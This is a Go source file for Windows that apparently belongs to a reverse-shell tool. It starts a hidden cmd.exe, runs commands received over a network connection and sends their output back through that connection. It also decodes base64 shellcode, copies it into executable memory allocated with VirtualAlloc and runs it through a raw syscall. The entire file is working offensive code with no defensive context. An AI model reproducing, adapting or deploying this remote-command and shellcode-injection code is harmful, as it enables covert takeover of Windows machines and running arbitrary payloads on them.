// +build windows !linux !darwin !freebsd

package shell

import (
	"encoding/base64"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func GetShell() *exec.Cmd {
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			go ExecShellcode(shellcode)
		}
	}
}

func ExecShellcode(shellcode []byte) {
	// Resolve kernell32.dll, and VirtualAlloc
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	// Reserve space to drop shellcode
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	// Ugly, but works
	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
	// Copy shellcode
	for i := 0; i < len(shellcode); i++ {
		addrPtr[i] = shellcode[i]
	}
	go syscall.Syscall(address, 0, 0, 0, 0)
}
